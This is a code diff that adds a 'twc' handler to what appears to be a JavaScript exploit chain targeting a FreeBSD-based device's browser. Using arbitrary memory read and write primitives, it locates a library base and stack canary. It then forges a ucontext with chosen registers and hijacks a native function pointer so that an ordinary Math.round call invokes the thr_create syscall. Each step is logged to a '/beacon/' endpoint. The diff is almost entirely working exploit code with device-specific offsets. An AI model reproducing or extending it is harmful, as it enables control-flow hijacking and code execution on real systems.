@@ -5714,6 +5714,99 @@ function _startWsShell(){
         break;
       }
 
+      case 'twc':{
+        /* THE THR_CREATE WITNESS (the 80k-proven route): thr_create
+         * (syscall 430) takes NO SIZE ARG - RDI = a ucontext_t I
+         * FULLY CONTROL (mc_rip/mc_rsp/mc_rdi/mc_rsi = the child's
+         * registers!), RSI = the tid WRITE target (= cfr - the
+         * callerFrame field, NOT READ on the post-call path per
+         * the trampoline source), RDX = flags (= the NativeExec
+         * pointer - 16-aligned: bit0=0 not-suspended, bit1=0 not-
+         * detached). THE WITNESS: the kernel writes the new tid to
+         * [cfr] on success. The 80k offsets (14.10 device-proven):
+         * mc_rip=+0xE0, mc_cs=+0xE8 (0x43), mc_rflags=+0xF0,
+         * mc_rsp=+0xF8, mc_ss=+0x100 (0x3B), mc_rdi=+0x38,
+         * mc_rsi=+0x40. thr_create's 14.10 stub: 13.60 pos 31 ->
+         * the sub-0x2C0 candidates: 0x130 (#1) / 0x230 (#4) - the
+         * zeroed-ctx sweep survivors (mc_cs=0 -> EINVAL ✓). */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function TC(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('TWC-'+s),false);x.send();}catch(e){}}
+        try{
+          var cfr=S.cfr;
+          if(!cfr||cfr<0x400000000n){reply.err='No cfr';break;}
+          /* the chain -> lk_base */
+          var ent=S.absRead(0x10001c8000n,0x100);
+          var trPtr=0n;
+          for(var ei=0;ei<ent.length;ei++){if(ent[ei]>=0x10001f0000n&&ent[ei]<0x1000200000n){trPtr=ent[ei];break;}}
+          if(trPtr===0n){reply.err='no thread-record ptr';break;}
+          var tr=S.absRead(trPtr,0x60);
+          var ptp=0n;
+          for(var ti2=0;ti2<tr.length;ti2++){if(tr[ti2]>=0x880000000n&&tr[ti2]<0x900000000n){ptp=tr[ti2];break;}}
+          if(ptp===0n){reply.err='no pthread ptr';break;}
+          var node=ptp,Q=0n;
+          for(var hop=0;hop<5;hop++){
+            var p=S.absRead(node,0x60);
+            Q=p[8];
+            if((Q&0x3fffn)===0x218n&&Q>0x800000000n)break;
+            node=Q-0x38n;
+          }
+          if((Q&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+          var B=Q-0x6C218n;
+          if(B%0x4000n!==0n){reply.err='base unaligned';break;}
+          var can=S.absRead(B+0x751D0n,8)[0];
+          TC('1 B=0x'+B.toString(16)+' canary=0x'+can.toString(16));
+          if(!(can>0x1000000n)){reply.err='canary fail';break;}
+          reply.base='0x'+B.toString(16);
+          /* the target: msg.rva (default 0x130) */
+          var rva=parseInt(msg.rva,16)||0x130;
+          var target=B+BigInt(rva);
+          TC('2 target=0x'+target.toString(16)+' (lk+0x'+rva.toString(16)+')');
+          reply.target='lk+0x'+rva.toString(16);
+          /* the spin stub: the #16 proven-harmless instant */
+          var spinRva=parseInt(msg.spin,16)||0x7A0;
+          var spinStub=B+BigInt(spinRva);
+          /* the sled: [fakeScope+0x800, +0x3800) = 1536 entries */
+          var sledBase=S.fakeScope+0x800n;
+          var sledSize=0x3000;
+          var sledTop=sledBase+BigInt(sledSize);
+          TC('3 spin=0x'+spinStub.toString(16)+' sled top=0x'+sledTop.toString(16));
+          /* zero the ucontext region + the sled */
+          for(var zi=0;zi<0x600/8;zi++)S.absWrite(S.fakeScope+BigInt(zi*8),0n);
+          for(var zi2=0;zi2<sledSize/8;zi2++)S.absWrite(sledBase+BigInt(zi2*8),spinStub);
+          TC('4 zeroed ctx + sled filled n='+(sledSize/8));
+          /* build the ucontext AT the fakeScope (RDI = the scope!) */
+          var scratch=S.fakeScope+0x700n;
+          S.absWrite(S.fakeScope+0x38n,scratch);   /* mc_rdi */
+          S.absWrite(S.fakeScope+0x40n,0n);          /* mc_rsi */
+          S.absWrite(S.fakeScope+0xE0n,spinStub);   /* mc_rip */
+          S.absWrite(S.fakeScope+0xE8n,0x43n);      /* mc_cs */
+          S.absWrite(S.fakeScope+0xF0n,0x246n);     /* mc_rflags */
+          S.absWrite(S.fakeScope+0xF8n,sledTop);    /* mc_rsp */
+          S.absWrite(S.fakeScope+0x100n,0x3Bn);     /* mc_ss */
+          TC('5 ctx built rip=0x'+spinStub.toString(16)+' rsp=0x'+sledTop.toString(16));
+          /* zero the witness spot: the tid lands at [cfr] */
+          var cfrSave=S.absRead(cfr,8)[0];
+          TC('6 cfr=0x'+cfr.toString(16)+' save=0x'+cfrSave.toString(16));
+          /* THE CALL: RDI = the ctx (the scope), RSI = cfr (tid out), RDX = NE (flags) */
+          if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
+          var origFnR=S.absRead(S.neEntry.addr+0x28n,8)[0];
+          S.absWrite(S.neEntry.addr+0x28n,target);
+          TC('7 CALLING');
+          try{Math.round(-5.7);}catch(e){}
+          /* THE WITNESS READ FIRST: [cfr] = the tid if the thread was created */
+          var tid=S.absRead(cfr,8)[0];
+          TC('8 TID=0x'+tid.toString(16)+' (save was 0x'+cfrSave.toString(16)+')');
+          S.absWrite(S.neEntry.addr+0x28n,origFnR);
+          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+          TC('9 RESTORED');
+          reply.tid='0x'+tid.toString(16);
+          reply.tidWas='0x'+cfrSave.toString(16);
+          reply.threadCreated=(tid!==cfrSave&&tid>0n&&tid<0x100000n);
+          reply.verified=(S.absRead(S.neEntry.addr+0x28n,8)[0]===origFnR);
+        }catch(e2){reply.err='twc fault: '+String(e2&&e2.message?e2.message:'?');}
+        break;
+      }
+
       case 'tw':{
         /* THE THREAD WITNESS (the game lane's 56l probe ported): the
          * thr_new candidate (export entry #msg.idx) called with a FULLY
